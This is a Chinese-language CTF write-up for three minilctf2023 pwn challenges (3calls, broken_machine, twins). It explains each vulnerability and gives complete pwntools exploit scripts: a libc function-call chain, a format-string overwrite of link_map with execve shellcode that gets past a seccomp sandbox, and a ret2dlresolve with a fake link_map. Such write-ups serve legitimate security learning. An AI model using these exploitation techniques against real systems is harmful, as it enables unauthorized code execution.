# minilctf2023 pwn wp

## 3calls

`checksec`看到保护全开，程序没有沙箱，也就没必要用描述中说的orw

IDA打开看到程序直接给出了libc地址，会读取3次，然后check读入的数据，最后依次调用读入的3个函数。check函数会检查libc中是否由地址所对应的函数，也就是不能随意调用某一句，只能调用封装好的整个函数。

```c
  libc = (__int64)(&printf - 49390);
  printf("gift: %p\n", &printf - 49390);
  for ( i = 0; i <= 2; ++i )
    read(0, &F[i], 8uLL);
  puts("good job!");
  for ( j = 0; j <= 2; ++j )
    F[j]();
```

这样一来，`system`函数必不可少。然后就是需要给其传参，显然不能直接传参。调试发现（调试时可以patch掉check函数，因为check函数会产生其他进程，让gdb无法attach到后续逻辑）程序执行`F[0]`时的rdi为

```asm
 RDI  0x7ffff7faea70 (_IO_stdfile_1_lock) ◂— 0x0
```

这个区域是一个可读写的区域，因此可以调用gets函数读取`/bin/sh`字符串，但是在调用gets的时候出现了一些玄学的问题（我没调试清楚），我第一次需要用一个gets直接读取换行符，第二个gets读取`/bin0sh`字符串（因为字符0的位置在下一个函数执行时会自动减一，也是没调试清楚），然后第三次就直接`system("/bin/sh")`了

exp:

```python
#!/usr/bin/env python3
from pwn import*
context(arch = 'x86_64', log_level = 'debug')

#io = remote('localhost',34643)
io = process('./3calls_2')
libc = ELF('./libc.so.6')

io.recvuntil(b'0x')
libcbase = int(io.recv(12), 16)
log.success('libcbase ===> '+hex(libcbase))

#attach(io)
#pause()

io.send(p64(libcbase+libc.symbols['gets']))
sleep(0.1)
io.send(p64(libcbase+libc.symbols['gets']))
sleep(0.1)
io.send(p64(libcbase+libc.symbols['system']))
sleep(1)

io.recvuntil(b'good job!\n')
io.send(b'\n')
sleep(1)
io.sendline(b'/bin0sh')
sleep(1)

io.interactive()
```

## broken_machine

Wings说这道题非预期了，预期解是在沙箱下硬搞，想想就害怕😰，这里写写我的非预期，非预期的地方是在进入沙箱之前就通过signal异常处理来退出，进入`_dl_fini`执行对应指针，然后`execve("/bin/sh\x00", 0, 0)`

`checksec`看到只没开PIE，IDA打开看到

```c
  puts("Hi there! I've made a shellcode machine. Could you please input you code to test my machine? Thank you!");
  signal(11, handler);
  fgets(buf, 1024, stdin);
  v4 = 0;
  for ( i = 0; i <= 1023; ++i )
    v4 += buf[i] == 110;
  if ( v4 <= 1 )
    machine();
```

`signal(11, handler);`信号处理函数会在程序执行产生`SIGSEGV`信号即异常时会进入handler函数进行退出。后面的for循环会检查读入了几个n，最多只能读入一个n

然后看`machine()`函数

```c
__int64 machine()
{
  char *s; // [rsp+8h] [rbp-8h]

  s = (char *)mmap((void *)0x1000, 0x1000uLL, 7, 34, -1, 0LL);
  puts("Prepare code...");
  sprintf(s, buf);
  sleep(1u);
  puts("Setup sandbox...");
  mprotect(s, 0x1000uLL, 5);
  sandbox();
  sleep(1u);
  puts("Finished!");
  return MEMORY[0x1000]();
}
```

mmap会分配一片可读可写可执行的区域，地址为0x1000，但是要注意的是在一般在linux系统中mmap可分配的最低地址为0x10000`cat /proc/sys/vm/mmap_min_addr可以查看系统mmap可申请最低内存，一般为65536`（参考文章：[mmap x86小于0x10000的虚地址 | Richard's Blog (richardustc.github.io)](http://richardustc.github.io/2013-05-21-2013-05-21-min-mmap-addr.html)），因此s的地址实际上是0x10000，所以最后的shellcode跳转实际上是非法内存访问，会直接跳转到信号处理函数

sprintf这里是一个格式化字符串漏洞，后面沙箱会限制常用的一些系统调用，如下

```c
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x14 0xc000003e  if (A != ARCH_X86_64) goto 0022
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x12 0x00 0x40000000  if (A >= 0x40000000) goto 0022
 0004: 0x15 0x11 0x00 0x0000003b  if (A == execve) goto 0022
 0005: 0x15 0x10 0x00 0x00000142  if (A == execveat) goto 0022
 0006: 0x15 0x0f 0x00 0x00000002  if (A == open) goto 0022
 0007: 0x15 0x0e 0x00 0x00000101  if (A == openat) goto 0022
 0008: 0x15 0x0d 0x00 0x00000000  if (A == read) goto 0022
 0009: 0x15 0x0c 0x00 0x00000013  if (A == readv) goto 0022
 0010: 0x15 0x0b 0x00 0x00000011  if (A == pread64) goto 0022
 0011: 0x15 0x0a 0x00 0x00000127  if (A == preadv) goto 0022
 0012: 0x15 0x09 0x00 0x00000039  if (A == fork) goto 0022
 0013: 0x15 0x08 0x00 0x0000003a  if (A == vfork) goto 0022
 0014: 0x15 0x07 0x00 0x00000029  if (A == socket) goto 0022
 0015: 0x15 0x06 0x00 0x0000002a  if (A == connect) goto 0022
 0016: 0x15 0x05 0x00 0x0000002b  if (A == accept) goto 0022
 0017: 0x15 0x04 0x00 0x0000009d  if (A == prctl) goto 0022
 0018: 0x15 0x03 0x00 0x00000065  if (A == ptrace) goto 0022
 0019: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0022
 0020: 0x15 0x01 0x00 0x0000000a  if (A == mprotect) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x06 0x00 0x00 0x00000000  return KILL
```

可以看到基本常用的getshell，orw的都被禁用了

然后可利用的漏洞就只有sprintf的格式化字符串了，而且还只能用一次%n，题目后面给出了hint`栈里面怎么会有ld地址，这是什么`，然后调试到栈部分，发现了两个ld地址

```asm
0x7ffeeaf26778 —▸ 0x7f6948f8f040 (_rtld_global) —▸ 0x7f6948f902e0 ◂— 0x0
0x7ffeeaf267e0 —▸ 0x7f6948f902e0 ◂— 0x0
```

一个是`_rtld_global`结构体的地址，一个是`_rtld_global`结构体的`link_map`地址，可以都用%n试试，然后就能发现改第二个的时候，程序在`exit()`的时候会跳转到一个奇怪的地址，比如我们修改它为0x10，调试时在执行sprintf后发出`signal SIGSEGV`后进入信号处理发现程序崩溃

```asm
0x0000000000000080 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────[ REGISTERS / show-flags off / show-compact-regsoff]──────────────────────
*RAX  0x403d90 (_DYNAMIC+8) ◂— 0x80
*RBX  0x7f2e26821040 (_rtld_global) —▸ 0x7f2e268222e0 ◂— 0x10
 RCX  0x1
*RDX  0x1
*RDI  0x7f2e26821a48 (_rtld_global+2568) ◂— 0x0
*RSI  0x403d90 (_DYNAMIC+8) ◂— 0x80
*R8   0x7ffdd880a720 —▸ 0x7f2e268222e0 ◂— 0x10
*R9   0x20
 R10  0x0
*R11  0x7ffdd880a650 —▸ 0x7f2e268222e0 ◂— 0x10
*R12  0x0
*R13  0x7f2e26821a48 (_rtld_global+2568) ◂— 0x0
*R14  0x7ffdd880a720 —▸ 0x7f2e268222e0 ◂— 0x10
*R15  0x7f2e268222e0 ◂— 0x10
*RBP  0x7ffdd880a7a0 ◂— 0x0
*RSP  0x7ffdd880a718 —▸ 0x7f2e267ed24e (_dl_fini+526) ◂— mov rax, qword ptr [rbp - 0x38]
*RIP  0x80
───────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────
Invalid address 0x80










──────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────
00:0000│ rsp    0x7ffdd880a718 —▸ 0x7f2e267ed24e (_dl_fini+526) ◂— mov rax, qword ptr [rbp - 0x38]
01:0008│ r8 r14 0x7ffdd880a720 —▸ 0x7f2e268222e0 ◂— 0x10
02:0010│        0x7ffdd880a728 —▸ 0x7f2e26822890 —▸ 0x7ffdd89e7000 ◂— jg 0x7ffdd89e7047
03:0018│        0x7ffdd880a730 —▸ 0x7f2e267e54d0 —▸ 0x7f2e265ab000 ◂— 0x3010102464c457f
04:0020│        0x7ffdd880a738 —▸ 0x7f2e26821af0 (_rtld_global+2736) —▸ 0x7f2e267e7000 ◂— 0x3010102464c457f
05:0028│        0x7ffdd880a740 ◂— 0x1efe9660
06:0030│        0x7ffdd880a748 —▸ 0x7ffdd880a740 ◂— 0x1efe9660
07:0038│        0x7ffdd880a750 —▸ 0x7ffdd880a740 ◂— 0x1efe9660
──────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────
 ► f 0             0x80
   f 1   0x7f2e267ed24e _dl_fini+526
   f 2   0x7f2e265f0495 __run_exit_handlers+261
   f 3   0x7f2e265f0610 on_exit
   f 4         0x4012c3 sandbox
   f 5   0x7f2e265ed520 __restore_rt
   f 6         0x4013d1 machine+95
   f 7         0x40150a main+227
```

可以看到时`_dl_fini`中调用了函数指针，该函数调用部分源码如下

```c
		for (i = 0; i < nmaps; ++i)
	    {
	      struct link_map *l = maps[i];

	      if (l->l_init_called)
		{
		  ...省略

		      /* First see whether an array is given.  */
		      if (l->l_info[DT_FINI_ARRAY] != NULL)
			{
			  ElfW(Addr) *array =
			    (ElfW(Addr) *) (l->l_addr
					    + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
			  unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
					    / sizeof (ElfW(Addr)));
			  while (i-- > 0)
			    ((fini_t) array[i]) ();
			}
```

可以看到我们要调用`((fini_t) array[i])()`，就得先弄清前面给array赋值和给i赋值的部分，因此来看`link_map`结构体

```c
struct link_map
{
    ElfW(Addr) l_addr;        /* Difference between the address in the ELF
                   file and the addresses in memory.  */
    char *l_name;        /* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;        /* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
 
     /* All following members are internal to the dynamic linker.
       They may change without notice.  */
 
    /* This is an element which is only ever different from a pointer to
       the very same copy of this type for ld.so when it is used in more
       than one namespace.  */
    struct link_map *l_real;
    ......
};
```

可以看到第一个成员就是`l_addr`，也就是我们修改的部分。然后调试查看`l->l_info[DT_FINI_ARRAY]->d_un.d_ptr`和`l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val`的值，其中`DT_FINI_ARRAY = 26` `DT_FINI_ARRAYSZ = 28`，而`d_un`为一个共用体，有两个成员`d_ptr和d_val`。

```c
$5 = {
  l_addr = 16,
  l_name = 0x7fc3d13e2888 "",
  l_ld = 0x403d88,
  l_next = 0x7fc3d13e2890,
  ...
  l_info = {0x0, 0x403d88, 0x403e68, 0x403e58, 0x0, 0x403e08, 0x403e18, 0x403e98, 0x403ea8, 0x403eb8, 0x403e28, 0x403e38, 0x403d98, 0x403da8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x403e78, 0x403e48, 0x0, 0x403e88, 0x403ed8, 0x403db8, 0x403dd8, 0x403dc8, 0x403de8, 0x0, 0x403ec8, 0x0, 0x0, 0x0, 0x0, 0x403ef8, 0x403ee8, 0x0, 0x0, 0x403ed8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x403f08, 0x0 <repeats 25 times>, 0x403df8},
  ...
}
```

因此`l->l_info[DT_FINI_ARRAY]->d_un.d_ptr`为`0x403d78`，`l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val`为`8`，最后调用位置为`0x403d90`所指向的地址`0x80`（其实做的时候直接对比下两次不同输入的暂停地址就行了，不需要分析这么多

因此我们可以通过格式化字符串修改偏移到bss段上buf位置，就可以控制指向任意位置，直接指向shellcode位置然后顺便在sprintf中触发异常信号处理绕过沙箱getshell。（在写shellcode的时候应该注意不要在shellcode中出现\0，因为sprintf会进行0截断，要赋值0直接异或就行了）

exp:

```python
#!/usr/bin/env python3
from pwn import*
context(arch='x86_64',log_level = 'debug')


#io = remote('localhost',34657)
io = process('./broken_machine')

attach(io, 'b machine')
pause()

io.recvuntil(b'Hi there! I\'ve made a shellcode machine. Could you please input you code to test my machine? Thank you!\n')
shellcode = '''
    mov rax, 0xff978cd091969dd0
    xor rax, -1
    push rax
    mov rdi, rsp
    mov rsi, r12
    mov rdx, r12
    mov rax, r12
    mov al, 0x3b
    syscall
'''
shellcode = asm(shellcode)
io.sendline(b'%1188c%35$hn'+shellcode.ljust(0xf0, b'A')+b'%100000c'+p64(0x104a4))

io.interactive()
```

## twins

`checksec`看到只开了NX，程序是一个简单的栈溢出程序，除此之外还给出了一个py文件。

不考虑py文件的话直接ret2libc就可以解决，但那是不可能的

观察python文件种如下函数

```python
while a1 and a2:
    line = sys.stdin.buffer.readline()
    out1, a1 = interact(p1, line)
    out2, a2 = interact(p2, line)
    if out1 != out2:
        print("Output conflict!", flush=True)
        print(f'process 1: {out1}', flush=True)
        print(f'process 2: {out2}', flush=True)
        break
    else:
        print(out1[:-1].decode(), flush=True)
```

远程会同时运行p1，p2两个进程，上述函数表示程序的输出只能一致，否则直接结束，因此考虑到ret2libc必须要泄露libc，而两个程序的libc基址由于存在ASLR机制，因此不可能一致。所以我们可以把这个程序看作一个无输出的栈溢出程序，考虑ret2dlresolve，构造的时候发现工具构造打不通，所以网上随便找个模板然后改下某些值直接用（主要还是因为我是langou，不想自己写

exp：

```python
#!/usr/bin/env python3
from pwn import*
context.log_level = 'debug'
context.arch = 'amd64'

p = process('./twins')
#p = remote("localhost",43677)
elf = ELF('./twins')
libc=  ELF('./libc-2.31.so')

#attach(p)
#pause()

def build_fake_link_map(elf,fake_linkmap_addr,one_got,offset):
	target_addr = fake_linkmap_addr-8       #the result you write in
	linkmap = p64(offset & (2**64-1))       #l_addr
	linkmap = linkmap.ljust(0x68,b'\x00')
	linkmap += p64(fake_linkmap_addr)       #l_info[5] dynstr
	linkmap += p64(fake_linkmap_addr+0x100) #l_info[6] dynsym
	linkmap = linkmap.ljust(0xf8,b'\x00') 
	linkmap += p64(fake_linkmap_addr+0x110) #l_info[23] jmprel
	linkmap += p64(0)+p64(one_got-8)        #dynmic symtab
	linkmap += p64(0)+p64(fake_linkmap_addr+0x120) #dynmic jmprel
	linkmap += p64(target_addr-offset)+p64(7)+p64(0) #fake_jmprel
	return linkmap

plt0 = elf.get_section_by_name('.plt').header.sh_addr
fake_link_map_addr = 0x00404000 +0x500
fake_link_map = build_fake_link_map(elf,fake_link_map_addr,elf.got['gets'],libc.sym['system']-libc.sym['gets'])
sh_addr = fake_link_map_addr + len(fake_link_map)
prdi = 0x401283
prsi_r15 = 0x401281
payload = 0x18*b'\x00'+p64(prdi)+p64(fake_link_map_addr)+p64(elf.plt['gets'])
payload += p64(prdi) + p64(sh_addr) + p64(plt0+6)+p64(fake_link_map_addr)+p64(0)
payload = payload.ljust(0x200,b'\x00')
p.sendline(payload)

payload = fake_link_map+b'cat flag\x00'
p.sendline(payload)

p.interactive()
```

